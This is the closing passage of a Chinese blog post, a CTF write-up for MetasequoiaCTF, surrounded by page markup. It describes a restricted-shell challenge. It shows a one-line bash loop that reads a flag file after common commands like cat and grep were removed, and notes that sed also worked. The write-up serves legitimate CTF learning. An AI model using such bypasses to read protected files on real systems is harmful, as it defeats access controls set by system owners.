<h3 id="官方解"><a href="#官方解" class="headerlink" title="官方解"></a>官方解</h3><p>出题人背锅的一道题，存在很多非预期解。</p>
<p>预期解法是</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while read -r line;do echo $line;done&lt;/.flag</span><br></pre></td></tr></table></figure></div>

<p>但实际做下来发现，因为没有对输入进行限制，<code>sed</code>等命令就可以读到flag。删去的命令基本上是<code>cat, grep, head,more, tail, less, base64</code>等，其实还删去了<code>/usr/bin/</code>下的内容。</p>
<h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>出题师傅们十分用心，<a href="https://github.com/SignorMercurio/MetasequoiaCTF" target="_blank" rel="noopener">官方wp</a>讲解的超级详细，体验很好的一次CTF比赛~</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:742954809@qq.com">TaQini</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://taqini.space/2020/02/21/MetasequoiaCTF-writeup/">http://taqini.space/2020/02/21/MetasequoiaCTF-writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://taqini.space">TaQini</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/double-free/">double free    </a><a class="post-meta__tags" href="/tags/dig/">dig    </a><a class="post-meta__tags" href="/tags/rabbit/">rabbit    </a><a class="post-meta__tags" href="/tags/%E4%BA%8C%E7%BB%B4%E7%A0%81/">二维码    </a><a class="post-meta__tags" href="/tags/RSA/">RSA    </a><a class="post-meta__tags" href="/tags/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/">RSA共模攻击    </a><a class="post-meta__tags" href="/tags/smali/">smali    </a><a class="post-meta__tags" href="/tags/fastbin/">fastbin    </a><a class="post-meta__tags" href="/tags/nop-sled/">nop sled    </a><a class="post-meta__tags" href="/tags/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0/">无符号整数    </a><a class="post-meta__tags" href="/tags/shell/">shell    </a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200221201016.png" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/wechat.png" alt="微信"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/alipay.jpg" alt="支付寶"><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/02/22/Double-free/"><img class="prev_cover lazyload" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/pwn_cover.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>Fastbin Double free 知识点总结</span></div></a></div><div class="next-post pull_right"><a href="/2020/02/19/pwn-technique/"><img class="next_cover lazyload" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/pwn.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>Pwn小技巧总结</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/02/13/ACTF2020-writeup/" title="ACTF2020 writeup"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200213172719.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-13</div><div class="relatedPosts_title">ACTF2020 writeup</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/23/ACTF2020-scp-foundation-writeup/" title="ACT2020 SCP_Foundation writeup"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200213172719.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-23</div><div class="relatedPosts_title">ACT2020 SCP_Foundation writeup</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/22/Double-free/" title="Fastbin Double free 知识点总结"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/pwn_cover.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-22</div><div class="relatedPosts_title">Fastbin Double free 知识点总结</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/12/2020-Hgame-pwn-writeup/" title="Hgame 2020 pwn writeup"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212030429.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-12</div><div class="relatedPosts_title">Hgame 2020 pwn writeup</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div id="lv-container" data-id="city" data-uid="MTAyMC80OTM3Ny8yNTg2OQ=="><script>(function(d, s) {
    var j, e = d.getElementsByTagName(s)[0];
    if (typeof LivereTower === 'function') { return; }
    j = d.createElement(s);
    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
    j.async = true;
    e.parentNode.insertBefore(j, e);
})(document, 'script');</script></div></div></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By TaQini</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div><div class="footer_custom_text">欢迎来到我的博客~</div><div class="icp"><a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener"><img class="icp-icon" src="/img/icp.png"><span>京ICP备20005724号-1</span></a></div><!--iframe(frameborder='no' border='0' marginwidth='0' marginheight='0' width=240 height=120 src="//music.163.com/outchain/player?type=0&id=4935952990&auto=1&height=90")--><!-- Matomo Image Tracker--><img src="http://ma.taqini.space/matomo.php?idsite=1&amp;rec=1" style="border:0" alt=""><!-- End Matomo--></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-share" id="weixin" title="微信分享"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="http://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/fireworks.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script id="ribbon_piao" mobile="false" src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"position":"left","width":150,"height":300,"hOffset":20,"vOffset":-90},"mobile":{"show":true,"scale":1},"react":{"opacityDefault":0.3,"opacityOnHover":0.3,"opacity":0.95},"log":false});</script></body></html>